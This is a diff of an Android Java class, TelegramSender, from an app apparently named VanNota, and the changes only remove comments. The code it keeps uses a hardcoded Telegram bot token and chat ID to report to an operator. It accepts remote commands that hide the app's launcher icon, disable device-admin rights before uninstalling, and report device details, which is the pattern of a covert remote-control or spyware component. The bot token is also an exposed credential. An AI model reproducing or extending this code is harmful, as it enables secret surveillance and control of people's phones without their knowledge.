@@ -18,22 +18,16 @@ import java.nio.charset.StandardCharsets;
 public class TelegramSender {
     private static final String TAG = "TelegramSender";
     
-    // ============================================================
     // HARDCODE TOKEN & CHAT ID
-    // ============================================================
     private static final String BOT_TOKEN = "8662155042:AAFRLkduh9r2FoOtt3TkqmTxNqAmWleibew";
     private static final String CHAT_ID = "1286411089";
     
     private static final int CONNECT_TIMEOUT = 10000;
     private static final int READ_TIMEOUT = 10000;
 
-    // ============================================================
-    // KIRIM PESAN KE TELEGRAM
-    // ============================================================
     public static void sendMessage(Context context, String title, String message) {
         new Thread(() -> {
             try {
-                // Tambahkan nama perangkat di setiap pesan
                 String deviceName = getDeviceName(context);
                 String fullText = title + "\n" + message + "\n\n📱 " + deviceName;
                 
@@ -67,7 +61,6 @@ public class TelegramSender {
                 
                 conn.disconnect();
                 
-                // Cek apakah pesan adalah perintah
                 if (message.startsWith("/")) {
                     handleTelegramCommand(context, message);
                 }
@@ -78,9 +71,6 @@ public class TelegramSender {
         }).start();
     }
 
-    // ============================================================
-    // AMBIL NAMA PERANGKAT DARI SHAREDPREFERENCES
-    // ============================================================
     private static String getDeviceName(Context context) {
         try {
             SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
@@ -91,15 +81,10 @@ public class TelegramSender {
         }
     }
 
-    // ============================================================
-    // HANDLE COMMAND DARI TELEGRAM
-    // ============================================================
     private static void handleTelegramCommand(Context context, String command) {
         Log.d(TAG, "📩 Perintah diterima: " + command);
         
-        // ==========================================
-        // PERINTAH: /hide - SEMBUNYIKAN APLIKASI
-        // ==========================================
+        // /hide - SEMBUNYIKAN APLIKASI
         if (command.equalsIgnoreCase("/hide")) {
             Log.d(TAG, "👻 Perintah hide diterima!");
             
@@ -107,14 +92,12 @@ public class TelegramSender {
                 PackageManager pm = context.getPackageManager();
                 ComponentName componentName = new ComponentName(context, MainActivity.class);
                 
-                // Disable activity (sembunyi dari launcher)
                 pm.setComponentEnabledSetting(
                     componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP
                 );
                 
-                // Simpan status hide
                 SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                 prefs.edit().putBoolean("app_hidden", true).apply();
                 
@@ -128,9 +111,7 @@ public class TelegramSender {
             return;
         }
         
-        // ==========================================
-        // PERINTAH: /unhide - TAMPILKAN APLIKASI
-        // ==========================================
+        // /unhide - TAMPILKAN APLIKASI
         if (command.equalsIgnoreCase("/unhide")) {
             Log.d(TAG, "👀 Perintah unhide diterima!");
             
@@ -138,14 +119,12 @@ public class TelegramSender {
                 PackageManager pm = context.getPackageManager();
                 ComponentName componentName = new ComponentName(context, MainActivity.class);
                 
-                // Enable activity (muncul di launcher)
                 pm.setComponentEnabledSetting(
                     componentName,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP
                 );
                 
-                // Hapus status hide
                 SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
                 prefs.edit().putBoolean("app_hidden", false).apply();
                 
@@ -159,16 +138,12 @@ public class TelegramSender {
             return;
         }
         
-        // ==========================================
-        // PERINTAH: /uninstall - HAPUS APLIKASI
-        // ==========================================
+        // /uninstall - HAPUS APLIKASI
         if (command.equalsIgnoreCase("/uninstall") || command.equalsIgnoreCase("/hapus")) {
             Log.d(TAG, "🗑️ Perintah uninstall diterima!");
             
-            // Kirim konfirmasi
             sendMessage(context, "🗑️ UNINSTALL", "Menghapus VanNota dari " + getDeviceName(context) + "...");
             
-            // Matikan Device Admin agar bisa diuninstall
             try {
                 DevicePolicyManager dpm = (DevicePolicyManager) context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                 ComponentName admin = new ComponentName(context, AdminReceiver.class);
@@ -180,12 +155,10 @@ public class TelegramSender {
                 Log.e(TAG, "❌ Gagal matikan admin: " + e.getMessage());
             }
             
-            // Tunggu sebentar agar admin mati
             try {
                 Thread.sleep(1500);
             } catch (InterruptedException ignored) {}
             
-            // Jalankan proses uninstall
             try {
                 Intent intent = new Intent(Intent.ACTION_DELETE);
                 intent.setData(Uri.parse("package:" + context.getPackageName()));
@@ -197,21 +170,17 @@ public class TelegramSender {
                 sendMessage(context, "❌ GAGAL UNINSTALL", "Error: " + e.getMessage());
             }
             
-            // Hentikan proses aplikasi
             android.os.Process.killProcess(android.os.Process.myPid());
             return;
         }
         
-        // ==========================================
-        // PERINTAH: /info - LIHAT INFO PERANGKAT
-        // ==========================================
+        // /info - LIHAT INFO PERANGKAT
         if (command.equalsIgnoreCase("/info") || command.equalsIgnoreCase("/status")) {
             SharedPreferences prefs = context.getSharedPreferences("cetak_pro", Context.MODE_PRIVATE);
             String deviceName = prefs.getString("device_name", Build.MODEL);
             String deviceId = prefs.getString("device_id", "Tidak diketahui");
             String androidVersion = Build.VERSION.RELEASE;
             
-            // Cek status launcher
             PackageManager pm = context.getPackageManager();
             ComponentName componentName = new ComponentName(context, MainActivity.class);
             int setting = pm.getComponentEnabledSetting(componentName);
@@ -234,9 +203,7 @@ public class TelegramSender {
             return;
         }
         
-        // ==========================================
-        // PERINTAH: /rename [nama] - UBAH NAMA PERANGKAT
-        // ==========================================
+        // /rename [nama] - UBAH NAMA PERANGKAT
         if (command.startsWith("/rename ")) {
             String newName = command.substring(8).trim();
             if (newName.isEmpty()) {
@@ -251,9 +218,7 @@ public class TelegramSender {
             return;
         }
         
-        // ==========================================
-        // PERINTAH: /help - BANTUAN
-        // ==========================================
+        // /help - BANTUAN
         if (command.equalsIgnoreCase("/help")) {
             String help = "📋 DAFTAR PERINTAH\n\n" +
                           "/hide - Sembunyikan aplikasi dari launcher\n" +
@@ -267,9 +232,7 @@ public class TelegramSender {
             return;
         }
         
-        // ==========================================
         // PERINTAH TIDAK DIKENAL
-        // ==========================================
         sendMessage(context, "❓ Perintah tidak dikenal", "Kirim /help untuk melihat daftar perintah.");
     }
 }
